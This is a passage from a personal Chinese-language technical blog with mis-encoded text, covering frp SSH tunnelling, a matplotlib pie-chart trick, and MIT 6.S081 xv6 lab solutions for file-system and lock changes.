<p><img src="./images/blog20220519/aliPort.png" alt="ServerPort" /></p>
<p>æ³¨æ„åœ¨ubuntuä¸Šï¼Œè¿˜éœ€è¦å®‰è£…openssl-serverä½œä¸ºsshçš„æœåŠ¡ç«¯ã€‚</p>
<pre><code class="language-shell">sudo apt install openssh-server
</code></pre>
<p>ç”¨ ssh username@127.0.0.1 -p 22 æ£€éªŒæ˜¯å¦å®‰è£…æˆåŠŸã€‚</p>
<h2 id="å¯åŠ¨"><a class="header" href="#å¯åŠ¨">å¯åŠ¨</a></h2>
<p>åœ¨æœåŠ¡å™¨ä¸Šå¯åŠ¨frps</p>
<pre><code class="language-sh">sugar@Server:~/frp$ ./frps -c frps.ini 
2022/05/19 16:53:27 [I] [root.go:200] frps uses config file: frps.ini
2022/05/19 16:53:27 [I] [service.go:194] frps tcp listen on 0.0.0.0:7000
2022/05/19 16:53:27 [I] [root.go:209] frps started successfully
</code></pre>
<p>åœ¨ubuntuä¸Šå¯åŠ¨frpc</p>
<pre><code class="language-sh">ubuntuuser@ubuntu:~/Downloads/frp_0.41.0_linux_386$ ./frpc -c ./frpc.ini 
2022/05/19 16:53:32 [I] [service.go:326] [d96b48501a7ec2fc] login to server success, get run id [d96b48501a7ec2fc], server udp port [0]
2022/05/19 16:53:32 [I] [proxy_manager.go:144] [d96b48501a7ec2fc] proxy added: [ssh]
2022/05/19 16:53:32 [I] [control.go:181] [d96b48501a7ec2fc] [ssh] start proxy success

</code></pre>
<p>å¯è§è¿æ¥æˆåŠŸ</p>
<pre><code># é˜¿é‡Œäº‘æœåŠ¡å™¨çš„è¾“å‡º
2022/05/19 16:53:32 [I] [service.go:450] [d96b48501a7ec2fc] client login info: ip [43.227.137.26:13907] version [0.41.0] hostname [] os [linux] arch [386]
2022/05/19 16:53:32 [I] [tcp.go:64] [d96b48501a7ec2fc] [ssh] tcp proxy listen port [6000]
2022/05/19 16:53:32 [I] [control.go:465] [d96b48501a7ec2fc] new proxy [ssh] success
</code></pre>
<p>åœ¨æœ¬æœºä¸Šä½¿ç”¨sshç™»é™†ubuntu</p>
<pre><code>$ ssh -oPort=6000 ubuntuuser@xxx.xxx.xxx.xxx
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-37-generic x86_64)
</code></pre>
<p>å®Œæˆï¼</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ç”»é¥¼"><a class="header" href="#ç”»é¥¼">ç”»é¥¼</a></h1>
<p>æœ€è¿‘è¦æŠŠå®éªŒç»“æœæå¾—å¥½çœ‹ä¸€ç‚¹ï¼Œå‡†å¤‡ç”»ä¸ªé¥¼å›¾ã€‚</p>
<p>æ‰¾matplotlibçš„galleryæ‰¾åˆ°äº†ä¸€ä¸ªåŒå¿ƒé¥¼å›¾ï¼Œå‡†å¤‡åœ¨å†…åœˆä¸­æ¯éš”ä¸€ä¸ªè‰²å—åŠ ä¸€ä¸ªlabelï¼Œçœ‹<a href="https://matplotlib.org/stable/api/_as_gen/matplotlib.axes.Axes.pie.html#matplotlib.axes.Axes.pie">matplotlib.axes.Axes.pie</a>çš„å®˜æ–¹æ–‡æ¡£å‘ç°æœ‰ä¸ªautopctçš„å‚æ•°ï¼Œä¸€èˆ¬ç”¨æ¥è®¾ç½®é¥¼å›¾ä¸­æ¯ä¸ªæ‰‡å½¢çš„åœˆä¸Šæ–‡å­—æ ‡ç­¾ï¼Œä½†è¿™ä¸ªautopctä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºè¾“å…¥ã€‚</p>
<p>åœ¨<a href="https://stackoverflow.com/questions/6170246/how-do-i-use-matplotlib-autopct/6170354#6170354">stackoverflow</a>ä¸Šæ‰¾åˆ°äº†ç”¨æ³•ã€‚éœ€è¦è‡ªå·±å®šä¹‰ä¸€ä¸ªè¿”å›å‡½æ•°çš„å‡½æ•°ï¼Œæ¥ä¸ªæ€§åŒ–è¿™ä¸ªautopctçš„è¾“å‡ºã€‚</p>
<p>ä½¿ç”¨pythoné—­åŒ…çš„ç‰¹æ€§ï¼Œåœ¨å¤–å±‚å‡½æ•°ä¸­å®šä¹‰è®°å½•å¸ƒå°”å˜é‡shouldPrintï¼Œè®°å½•ä¸Šä¸ªæ‰‡å½¢æ˜¯å¦è¢«æ ‡è®°ã€‚</p>
<pre><code class="language-python">def make_autopct(values):
    shouldPrint = False

    def my_autopct(pct):
        nonlocal shouldPrint
        total = sum(values)
        val = int(round(pct*total/100.0))
        if shouldPrint:
            shouldPrint = False
            if val != 0:
                return '{p:.2f}% ({v:d})'.format(p=pct, v=val)
            else:
                return ''
        else:
            shouldPrint = True
            return ''
    return my_autopct
</code></pre>
<p>å†å°†è¿™ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ä¼ ç»™autopctï¼Œå‚æ•°æ˜¯å¹³æ•´åçš„valsä¸€ä½æ•°ç»„</p>
<pre><code class="language-python">def plotPie():
    vals = np.array([[30, 60], [20, 40], [55, 43], [22, 0]])
    fig, ax = plt.subplots()

    size = 0.3

    cmap = plt.get_cmap(&quot;tab20c&quot;)
    outer_colors = cmap(np.arange(4) * 4)
    inner_colors = cmap([1, 2, 5, 6, 9, 10, 13, 14])

    ax.pie(vals.sum(axis=1), radius=1, colors=outer_colors, labels=outer_labels,
           wedgeprops=dict(width=size, edgecolor='w'))

    ax.pie(vals.flatten(), radius=1 - size, colors=inner_colors, autopct=make_autopct(vals.flatten()),
           wedgeprops=dict(width=size, edgecolor='w'))

    ax.set(aspect=&quot;equal&quot;, title='The Pie')
    plt.show()
</code></pre>
<p>ğŸ«“å¦‚ä¸‹</p>
<p><img src="./images/blog20220517/out.jpg" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="æ¯äº²èŠ‚å¿«ä¹"><a class="header" href="#æ¯äº²èŠ‚å¿«ä¹">æ¯äº²èŠ‚å¿«ä¹</a></h1>
<p><img src="./images/blog20220507/carnations.png" alt="carnations" />
â€œA large bouquet of carnations in a glass jar by the sea at sunrise. Trending on artstation.â€</p>
<p>Created via <a href="https://colab.research.google.com/github/alembics/disco-diffusion/blob/main/Disco_Diffusion.ipynb">Disco Diffusion</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit6s081-file-system"><a class="header" href="#mit6s081-file-system">MIT6.S081 File System</a></h1>
<h2 id="part-1-large-files"><a class="header" href="#part-1-large-files">Part 1 Large files</a></h2>
<p>å¢åŠ ä¸€ä¸ªæ–‡ä»¶çš„æœ€å¤§å¤§å°ï¼Œé€šè¿‡å°†inodeçš„ä¸€ä¸ªç›´æ¥å—å˜æˆä¸€ä¸ªäºŒæ¬¡é—´æ¥å—</p>
<p>fs.c ballocåœ¨bitmapä¸­æŸ¥æ‰¾unused blockï¼Œä½¿ç”¨bio.cä¸­çš„breadå’Œbrelseæ¥åŒæ­¥è®¿é—®</p>
<p>when to use log-writeï¼ŸÂ After finishing all writes on the buf.</p>
<p>fs.c/bmap çš„ä½œç”¨<br />
åœ¨è¯»å–inodeèŠ‚ç‚¹æ•°æ®çš„æ—¶å€™(readi, writei)ï¼Œå°†åœ°å€è½¬æ¢ä¸ºå—æ‰€åœ¨åœ°å€ã€‚</p>
<p>å°†åŸæ¥çš„ç›´æ¥å—ä¸­åˆ†ä¸€ä¸ªå‡ºæ¥ä½œä¸ºäºŒæ¬¡é—´æ¥å—çš„ä¸€çº§å—</p>
<pre><code class="language-c">// fs.h
#define NDIRECT 11
#define NINDIRECT (BSIZE / sizeof(uint))
#define NDINDIRECT (NINDIRECT * NINDIRECT)  // Double-indirect block
#define MAXFILE (NDIRECT + NINDIRECT + NDINDIRECT)

// On-disk inode structure
struct dinode {
  short type;           // File type
  short major;          // Major device number (T_DEVICE only)
  short minor;          // Minor device number (T_DEVICE only)
  short nlink;          // Number of links to inode in file system
  uint size;            // Size of file (bytes)
  uint addrs[NDIRECT+2];   // Data block addresses
};

// file.h
// ä¿è¯On-dist inodeå’Œ å†…å­˜inodeçš„ addrs å¤§å°ä¸€è‡´
// in-memory copy of an inode
struct inode {
  uint dev;           // Device number
  uint inum;          // Inode number
  int ref;            // Reference count
  struct sleeplock lock; // protects everything below here
  int valid;          // inode has been read from disk?

  short type;         // copy of disk inode
  short major;
  short minor;
  short nlink;
  uint size;
  uint addrs[NDIRECT+2];
};
</code></pre>
<p>åœ¨fs.cä¸­å…·ä½“å®ç°äºŒæ¬¡é—´æ¥å—</p>
<pre><code class="language-c">static uint
bmap(struct inode *ip, uint bn) {
    uint addr, *a;
    struct buf *bp;

    if (bn &lt; NDIRECT) {
        if ((addr = ip-&gt;addrs[bn]) == 0)
            ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);
        return addr;
    }
    bn -= NDIRECT;

    if (bn &lt; NINDIRECT) {
        // Load indirect block, allocating if necessary.
        if ((addr = ip-&gt;addrs[NDIRECT]) == 0)
            ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);
        bp = bread(ip-&gt;dev, addr);
        a = (uint *) bp-&gt;data;
        if ((addr = a[bn]) == 0) {
            a[bn] = addr = balloc(ip-&gt;dev);
            log_write(bp);
        }
        brelse(bp);
        return addr;
    }

    bn -= NINDIRECT;

    if (bn &lt; NDINDIRECT) {
        if ((addr = ip-&gt;addrs[NDIRECT + 1]) == 0) {  // æš‚æœªåˆ†é…ä¸€çº§é—´æ¥å—
            ip-&gt;addrs[NDIRECT+1] = addr = balloc(ip-&gt;dev);
        }
        bp = bread(ip-&gt;dev, addr);  // ä¸€çº§é—´æ¥å—
        a = (uint *) bp-&gt;data;
        int first_index = bn / NINDIRECT;
        if ((addr = a[first_index]) == 0) {  // æš‚æœªåˆ†é…äºŒçº§é—´æ¥å—
            a[first_index] = addr = balloc(ip-&gt;dev);
            log_write(bp);
        }
        brelse(bp);

        bp = bread(ip-&gt;dev, addr);  // äºŒçº§é—´æ¥å—å†…å®¹
        a = (uint *)bp-&gt;data;

        int second_index = bn % NINDIRECT;
        if ((addr = a[second_index]) == 0) {  // æš‚æœªåˆ†é…æ•°æ®å—
            a[second_index] = addr = balloc(ip-&gt;dev);
            log_write(bp);
        }
        brelse(bp);
        return addr;
    }

    panic(&quot;bmap: out of range&quot;);
}

void
itrunc(struct inode *ip)
{
  int i, j, k;
  struct buf *bp, *bp2;
  uint *a, *a2;

  for(i = 0; i &lt; NDIRECT; i++){
    if(ip-&gt;addrs[i]){
      bfree(ip-&gt;dev, ip-&gt;addrs[i]);
      ip-&gt;addrs[i] = 0;
    }
  }

  if(ip-&gt;addrs[NDIRECT]){
    bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT]);
    a = (uint*)bp-&gt;data;
    for(j = 0; j &lt; NINDIRECT; j++){
      if(a[j])
        bfree(ip-&gt;dev, a[j]);
    }
    brelse(bp);
    bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT]);
    ip-&gt;addrs[NDIRECT] = 0;
  }

  if(ip-&gt;addrs[NDIRECT+1]) {
      bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT+1]);  // ä¸€çº§é—´æ¥å—
      a = (uint *)bp-&gt;data;
      for (j = 0; j &lt; NINDIRECT; j++) {
          if (a[j]) {
              bp2 = bread(ip-&gt;dev, a[j]);
              a2 = (uint*)bp2-&gt;data;
              for (k = 0; k &lt; NINDIRECT; k++) {
                  if (a2[k]) {
                      bfree(ip-&gt;dev, a2[k]);
                  }
              }
              brelse(bp2);
              bfree(ip-&gt;dev, a[j]);
          }
      }
      brelse(bp);
      bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT+1]);
      ip-&gt;addrs[NDIRECT+1] = 0;
  }

  ip-&gt;size = 0;
  iupdate(ip);
}
</code></pre>
<p>è¿è¡Œæµ‹è¯•</p>
<pre><code class="language-sh">$bigfile........................................................................................................
wrote 65803 blocks
bigfile done; ok
</code></pre>
<h2 id="part-2-symbolic-link"><a class="header" href="#part-2-symbolic-link">Part 2 Symbolic link</a></h2>
<p>å®ç°ç¬¦å·è¿æ¥ç³»ç»Ÿè°ƒç”¨</p>
<p>ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ã€Symbolic linkï¼‰æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œ å…¶åŒ…å«æœ‰ä¸€æ¡ä»¥ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„çš„å½¢å¼æŒ‡å‘å…¶å®ƒæ–‡ä»¶æˆ–è€…ç›®å½•çš„å¼•ç”¨ã€‚<br />
Implement the symlink(target, path) system call to create a new symbolic link at path that refers to target.<br />
Note that target does not need to exist for the system call to succeed.</p>
<p>åœ¨pathä¸­åˆ›å»ºä¸€ä¸ªåŒ…å«äº†targetè·¯å¾„çš„ç¬¦å·è¿æ¥</p>
<p>å¢åŠ ç³»ç»Ÿè°ƒç”¨symlink<br />
åœ¨sysfile.cä¸­å®ç°symlink</p>
<pre><code class="language-c">uint64
sys_symlink(void)
{
    char target[MAXPATH], path[MAXPATH];
    int n;
    if ((n = argstr(0, target, MAXPATH)) &lt; 0 || argstr(1, path, MAXPATH) &lt; 0)
        return -1;
    // create path directory and file
    struct inode *ip;
    begin_op();
    ip = create((char *)path, T_SYMLINK, 0, 0); // add the path file to the path directory
    if (ip == 0) {
        end_op();
        printf(&quot;Path not exist or the file already exists\n&quot;);
        return -1;
    }

    // write the string target to the path inode data
    if (writei(ip, 0, (uint64)&amp;target, 0, n) != n) {
        printf(&quot;Unable to write inode&quot;);
        iunlockput(ip);
        end_op();
        return -1;
    }

    iunlockput(ip);
    end_op();

    return 0;
}
</code></pre>
<p>ä¿®æ”¹sys_openï¼Œå¤„ç†æ‰“å¼€çš„æ˜¯ä¸€ä¸ªç¬¦å·è¿æ¥æ–‡ä»¶</p>
<pre><code class="language-c">uint64
sys_open(void) {
    char path[MAXPATH];
    int fd, omode;
    struct file *f;
    struct inode *ip;
    int n;

    if ((n = argstr(0, path, MAXPATH)) &lt; 0 || argint(1, &amp;omode) &lt; 0)
        return -1;

    begin_op();

    if (omode &amp; O_CREATE) {
        ip = create(path, T_FILE, 0, 0);
        if (ip == 0) {
            end_op();
            return -1;
        }
    } else {
        if ((ip = namei(path)) == 0) {
            end_op();
            return -1;
        }
        ilock(ip);
        if (ip-&gt;type == T_DIR &amp;&amp; omode != O_RDONLY) {
            iunlockput(ip);
            end_op();
            return -1;
        }
    }

    if ((omode &amp; O_NOFOLLOW) == 0) {  // follow the symbolic link
        int depth = MAXSYMLINK;
        uint inums[MAXSYMLINK];
        int i = 0;
        while (ip-&gt;type == T_SYMLINK &amp;&amp; depth-- &gt; 0) {
            char target_path[MAXPATH];
            inums[i] = ip-&gt;inum;  // record the seen inumber to avoid circle
            int nread;
            if ((nread = readi(ip, 0, (uint64) target_path, 0, MAXPATH)) &lt;= 0) {
                printf(&quot;Cannot read the inode content in open()\n&quot;);
                iunlockput(ip);
                end_op();
                return -1;
            }
            printf(&quot;readi read %d bytes\n&quot;, nread);
            iunlockput(ip);
            if ((ip = namei(target_path)) == 0) {
                end_op();
                return -1;
            }

            ilock(ip);
            // check whether there is a ring
            for (int j = 0; j &lt;= i; ++j) {
                if (ip-&gt;inum == inums[i]) {
                    printf(&quot;Got a circle symbolic link.\n&quot;);
                    iunlockput(ip);
                    end_op();
                    return -1;
                }
            }
        }

        if (depth &lt;= 0) {
            printf(&quot;Too deep of the symlink\n&quot;);
            iunlockput(ip);
            end_op();
            return -1;
        }
    }

    if (ip-&gt;type == T_DEVICE &amp;&amp; (ip-&gt;major &lt; 0 || ip-&gt;major &gt;= NDEV)) {
        iunlockput(ip);
        end_op();
        return -1;
    }
    // ......
}
</code></pre>
<p>æ³¨æ„ä»ç”¨æˆ·ç©ºé—´è·å–å­—ç¬¦ä¸²å‚æ•°è¦ä½¿ç”¨argstrï¼Œå¦‚æœä½¿ç”¨argaddrå¯èƒ½ä¼šå‡ºç°kerneltrapï¼ˆsauce=0xdï¼Œload page faultï¼‰</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit-6s081-locks"><a class="header" href="#mit-6s081-locks">MIT 6.S081 locks</a></h1>
<h2 id="part-1-memory-allocator"><a class="header" href="#part-1-memory-allocator">Part 1 Memory allocator</a></h2>
<p>æ”¹è¿›å†…å­˜åˆ†é…å™¨ï¼Œå®ç°per cpu freelistï¼Œå‡å°‘åœ¨kallocè¿‡ç¨‹ä¸­çš„é”ç«äº‰ã€‚</p>
<h3 id="kalloctestçš„è°ƒç”¨æ ˆ"><a class="header" href="#kalloctestçš„è°ƒç”¨æ ˆ">kalloctestçš„è°ƒç”¨æ ˆ</a></h3>
<pre><code>sysproc.c    proc.c         vm.c                     kalloc.c
sys_sbrk -&gt;  growproc   |-&gt; uvmalloc     -&gt;          kalloc
                        |_  uvmdealloc -&gt; uvmunmap -&gt; kfree
</code></pre>
<p>åˆæ¬¡è¿è¡Œkalloctest</p>
<pre><code class="language-sh">$ kalloctest
start test1
test1 results:
--- lock kmem/bcache stats
lock: kmem: #test-and-set 4684888 #acquire() 433086
lock: bcache: #test-and-set 0 #acquire() 2098
--- top 5 contended locks:
lock: kmem: #test-and-set 4684888 #acquire() 433086
lock: uart: #test-and-set 2622037 #acquire() 838
lock: proc: #test-and-set 1381255 #acquire() 258356
lock: proc: #test-and-set 1170755 #acquire() 258355
lock: proc: #test-and-set 1148248 #acquire() 258356
tot= 4684888
test1 FAIL
</code></pre>
<p>for each lock, the count of calls to acquire for that lock, and the number of times the loop in acquire tried but failed to set the lock. #test-and-setæ˜¯è‡ªæ—‹æ¬¡æ•° #acquire() æ˜¯å°è¯•è·å–é”çš„æ¬¡æ•°</p>
<p>éœ€è¦æ”¹è¿›ç©ºé—²é¡µé“¾è¡¨çš„é”æœºåˆ¶ï¼Œæ¯ä¸ªCPUä¸€ä¸ªé”ï¼Œå¯¹åº”ä¸€ä¸ªç©ºé—²é¡µé“¾è¡¨ å½“ä¸€ä¸ªcpuçš„freelistç©ºäº†åï¼Œä»å¦ä¸€ä¸ªcpuä¸­å·ä¸€ä¸ªï¼ˆæ³¨æ„åŠ é”ï¼‰</p>
<pre><code class="language-c">struct {
  struct spinlock lock;
  struct run *freelist;
  char name[7];
} kmem[NCPU];

static struct run * steal(int cpuid) {
    for (int i = (cpuid + 1) % NCPU; i != cpuid ; i = (i + 1) % NCPU) {
        acquire(&amp;kmem[i].lock);  // å¯¹è¢«å·å–çš„é“¾è¡¨åŠ é”
        if (kmem[i].freelist != 0) { // find a not empty list
            // find middle point of the list
            struct run *slow, *fast, *head = kmem[i].freelist;
            slow = kmem[i].freelist;
            fast = kmem[i].freelist;
            while (fast != 0 &amp;&amp; fast-&gt;next != 0) {
                slow = slow-&gt;next;
                fast = fast-&gt;next-&gt;next;
            }
            // the slow point to the middle
            kmem[i].freelist = slow-&gt;next;  // ååŠæ®µä½œä¸ºå½“å‰çš„é“¾è¡¨å¤´
            slow-&gt;next = 0;  // åˆ‡æ–­

            release(&amp;kmem[i].lock);
            return head;  // è¿”å›æ­¤é“¾è¡¨çš„å¤´ä½œä¸ºå·å–ç»“æœ
        }
        release(&amp;kmem[i].lock);
    }
    return 0;
}

// Allocate one 4096-byte page of physical memory.
// Returns a pointer that the kernel can use.
// Returns 0 if the memory cannot be allocated.
void *
kalloc(void)
{
    struct run *r;

    push_off();
    int id = cpuid();
    pop_off();

    acquire(&amp;kmem[id].lock);
    r = kmem[id].freelist;
    if (r) {
        kmem[id].freelist = r-&gt;next;
        release(&amp;kmem[id].lock);
    }
    else {
        release(&amp;kmem[id].lock); // æ³¨æ„é‡Šæ”¾å½“å‰é“¾è¡¨çš„é”ï¼Œé˜²æ­¢æ­»é”ï¼ˆæ‹¿ç€ä¸€ä¸ªé”ä¸æ”¾å»è·å–åˆ«çš„é”ï¼‰
        r = steal(id);
        if (r) {
            acquire(&amp;kmem[id].lock);
            kmem[id].freelist = r-&gt;next;
            release(&amp;kmem[id].lock);
        }
    }

    if (r)
        memset((char *) r, 5, PGSIZE); // fill with junk

    return (void *) r;
}
</code></pre>
<p>é—®é¢˜ï¼šå¦‚ä½•ç»™æ¯ä¸ªcpuåˆå§‹åŒ–freelist hintï¼šå›æ”¶ç»™å½“å‰æ­£åœ¨è¿è¡Œçš„cpuçš„freelist</p>
<p>åœ¨kallocæ—¶å·å–å…¶ä»–cpuçš„freelistï¼Œ&quot;steal part of the other CPU's free list. &quot; æ³¨æ„å½“cpuaåœ¨stealçš„æ—¶å€™ï¼Œä¸èƒ½æ‹¿ç€è‡ªå·±çš„é”ä¸æ”¾</p>
<pre><code class="language-c">void
kinit()
{
    for (int i = 0; i &lt; NCPU; i++) {
        snprintf(kmem[i].name, 7, &quot;kmem-%d&quot;, i);
        initlock(&amp;kmem[i].lock, kmem[i].name);
        kmem[i].freelist = 0;
    }
//    initlock(&amp;kmem.lock, &quot;kmem&quot;);
    freerange(end, (void*)PHYSTOP);
}

void
kfree(void *pa)
{
  struct run *r;

  if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)
    panic(&quot;kfree&quot;);

  // Fill with junk to catch dangling refs.
  memset(pa, 1, PGSIZE);

  push_off();
  int coreid = cpuid();
  pop_off();

  r = (struct run*)pa;

  acquire(&amp;kmem[coreid].lock);
  r-&gt;next = kmem[coreid].freelist;
  kmem[coreid].freelist = r;
  release(&amp;kmem[coreid].lock);
}
</code></pre>
<p>kalloctestè¿è¡Œç»“æœ</p>
<pre><code class="language-sh">$ ./kalloctest
start test1
test1 results:
--- lock kmem/bcache stats
lock: kmem-0: #test-and-set 0 #acquire() 34211
lock: kmem-1: #test-and-set 0 #acquire() 198354
lock: kmem-2: #test-and-set 0 #acquire() 200456
lock: kmem-3: #test-and-set 0 #acquire() 2
lock: kmem-4: #test-and-set 0 #acquire() 2
lock: kmem-5: #test-and-set 0 #acquire() 2
lock: kmem-6: #test-and-set 0 #acquire() 2
lock: kmem-7: #test-and-set 0 #acquire() 2
lock: bcache: #test-and-set 0 #acquire() 342
--- top 5 contended locks:
lock: proc: #test-and-set 21545 #acquire() 509603
lock: virtio_disk: #test-and-set 19495 #acquire() 57
lock: proc: #test-and-set 12286 #acquire() 509606
lock: proc: #test-and-set 7114 #acquire() 509436
lock: proc: #test-and-set 5269 #acquire() 509494
tot= 0
test1 OK
start test2
total free number of pages: 32499 (out of 32768)
.....
test2 OK
</code></pre>
<h2 id="part-2-buffer-cache"><a class="header" href="#part-2-buffer-cache">Part 2 Buffer cache</a></h2>
<p>bcachetest åˆ›å»ºå¤šä¸ªå­è¿›ç¨‹å¹¶å‘å®Œæˆå¯¹æ–‡ä»¶çš„è¯»å†™ï¼Œç«äº‰buffer cacheã€‚åˆæ¬¡è¿è¡Œbcachetestç»“æœå¦‚ä¸‹ï¼š</p>
<p>åŒæ ·æŒ‰ç…§part1çš„æ€è·¯ï¼Œå°†æ•´ä¸ªbufåˆ†åˆ°ï¼ˆæŒ‰ç…§blocknoè¿›è¡Œhashï¼‰å›ºå®šå¤§å°çš„æ¡¶ä¸­ï¼Œç”¨æ—¶é—´æˆ³æ¥å®ŒæˆLRUï¼Œåœ¨buf.hä¸­å¢åŠ timestampæˆå‘˜ã€‚åœ¨æˆ‘çš„ç¬¬ä¸€æ¬¡å®ç°ä¸­ï¼Œæ¡¶çš„çš„å¤§å°å›ºå®šã€‚ä½†æ˜¯è¿™ç§å®ç°æ€»æ˜¯ä¼šå‡ºç°åœ¨bgetè¿‡ç¨‹ä¸­å‡ºç°panic: bget: no bufferã€‚</p>
<pre><code class="language-c">#define BUCKET_NUM 13
#define NBUF_PER_BUCKET 3

struct {
  struct buf bucket[BUCKET_NUM][NBUF_PER_BUCKET];
  struct spinlock locks[BUCKET_NUM];
} bcache;

void
binit(void)
{
  struct buf *b;

//    initlock(&amp;bcache.lock, &quot;bcache&quot;);
    for (int i = 0; i &lt; BUCKET_NUM; ++i) {
        // åˆå§‹åŒ–æ¯ä¸ªæ¡¶çš„lock
        initlock(&amp;bcache.locks[i], &quot;bcache.bucket&quot;);
        // åˆå§‹åŒ–æ¡¶ä¸­çš„buffer
        for (b = bcache.bucket[i]; b &lt; bcache.bucket[i] + NBUF_PER_BUCKET; b++) {
            initsleeplock(&amp;b-&gt;lock, &quot;buffer&quot;);
            b-&gt;timestamp = ticks;
        }
    }
}

// Look through buffer cache for block on device dev.
// If not found, allocate a buffer.
// In either case, return locked buffer.
static struct buf*
bget(uint dev, uint blockno)
{
    struct buf *b;

    // Is the block already cached?
    int index = blockno % BUCKET_NUM;

    // acquire the bucket lock
    acquire(&amp;bcache.locks[index]);

    for (b = bcache.bucket[index]; b &lt; bcache.bucket[index] + NBUF_PER_BUCKET; b++) {
        if (b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno) {
            b-&gt;refcnt++;
            b-&gt;timestamp = ticks; // update timestamp
            release(&amp;bcache.locks[index]);
            acquiresleep(&amp;b-&gt;lock);
            return b;
        }
    }

    // Not cached.
    // Recycle the least recently used (LRU) unused buffer.
    int replace_i = -1;
    uint least_timestamp = ~0;

    for (int i = 0; i &lt; NBUF_PER_BUCKET; ++i) {  // look
        b = &amp;bcache.bucket[index][i];
        if (b-&gt;refcnt == 0 &amp;&amp; b-&gt;timestamp &lt; least_timestamp) {
            replace_i = i;
            least_timestamp = b-&gt;timestamp;
        }
    }
    if (replace_i != -1) {
        b = &amp;bcache.bucket[index][replace_i];
        b-&gt;dev = dev;
        b-&gt;blockno = blockno;
        b-&gt;valid = 0;
        b-&gt;refcnt = 1;
        b-&gt;timestamp = ticks;

        release(&amp;bcache.locks[index]);
        acquiresleep(&amp;b-&gt;lock);
        return b;
    } else {
        panic(&quot;bget: no buffers&quot;);
    }
}

void
brelse(struct buf *b)
{
    if (!holdingsleep(&amp;b-&gt;lock))
        panic(&quot;brelse&quot;);

    releasesleep(&amp;b-&gt;lock);

    int index = b-&gt;blockno % BUCKET_NUM;
    acquire(&amp;bcache.locks[index]);
    b-&gt;refcnt--;
    release(&amp;bcache.locks[index]);
}

void
bpin(struct buf *b) {
    int index = b-&gt;blockno % BUCKET_NUM;
    acquire(&amp;bcache.locks[index]);
    b-&gt;refcnt++;
    release(&amp;bcache.locks[index]);
}

void
bunpin(struct buf *b) {
    int index = b-&gt;blockno % BUCKET_NUM;
    acquire(&amp;bcache.locks[index]);
    b-&gt;refcnt--;
    release(&amp;bcache.locks[index]);
}
</code></pre>
<h3 id="ç¬¬äºŒæ¬¡è®¾è®¡"><a class="header" href="#ç¬¬äºŒæ¬¡è®¾è®¡">ç¬¬äºŒæ¬¡è®¾è®¡</a></h3>
<p>bucketä¸­çš„bufæ”¹ç”¨é“¾è¡¨è¿æ¥ï¼Œä¿ç•™åŸæ¥çš„çº¿æ€§bufè¡¨ï¼Œæ¯æ¬¡ä»bufé“¾è¡¨ä¸­ç”³è¯·bufæ”¾å…¥ç›¸å¯¹åº”çš„æ¡¶ä¸­ï¼Œå¦‚æœbufé“¾è¡¨ç”¨å®Œäº†ï¼Œå°±ä»å…¶ä»–bucketä¸­å·å–refcntä¸º0çš„bufåˆ°å½“å‰çš„bucketä¸­ã€‚</p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œé”çš„ä½¿ç”¨å¾ˆå·§å¦™ï¼Œå‚è€ƒäº†<a href="https://blog.csdn.net/LostUnravel/article/details/121430900">ç½‘ä¸Š</a>çš„è®¾è®¡ã€‚</p>
<p>æ³¨æ„ï¼š</p>
<p>ä¸èƒ½æ‹¿ç€ä¸€ä¸ªå°é”å»ç”³è¯·è·å–å…¶ä»–å°é”ï¼ˆå“²å­¦å®¶è¿›é¤é—®é¢˜ï¼‰ï¼›</p>
<p>å…ˆåŠ å¤§é”ï¼Œå†æ‹¿å°é”ã€‚åœ¨å‘å…¶ä»–æ¡¶å€Ÿbufçš„è¿‡ç¨‹ä¸­ï¼Œè¦å…ˆåŠ å¤§é”ï¼Œé˜²æ­¢å…¶ä»–å€Ÿbufçš„è¡Œä¸ºå‘ç”Ÿï¼Œå†åŠ å°é”ï¼Œé”å®šç‰¹å®šçš„ä¸¤ä¸ªbucketã€‚</p>
<p>æ¯æ¬¡é‡Šæ”¾é”ä¹‹åï¼Œä»»ä½•äº‹æƒ…éƒ½ä¼šå‘ç”Ÿï¼Œéœ€è¦å†æ£€æŸ¥ä¸€éé‡Šæ”¾é”ä¹‹å‰çš„äº‹æƒ…æ˜¯å¦æ”¹å˜ã€‚æ‰€ä»¥åœ¨å…·ä½“å®ç°æ—¶ï¼ŒæŠŠæ£€æŸ¥è‡ªå·±æ¡¶ä¸­çš„ç©ºbufå’Œå…¶ä»–æ¡¶ä¸­çš„ç©ºbufæ”¾åœ¨ä¸€æ¬¡åŠ é”å¾ªç¯ä¸­è¿›è¡Œã€‚</p>
<p>åœ¨æµ‹è¯•æ—¶ï¼Œæœ€å¥½å…ˆmake clean å† make qemu</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dockerå®è·µ"><a class="header" href="#dockerå®è·µ">Dockerå®è·µ</a></h1>
<h2 id="motivation-2"><a class="header" href="#motivation-2">Motivation</a></h2>
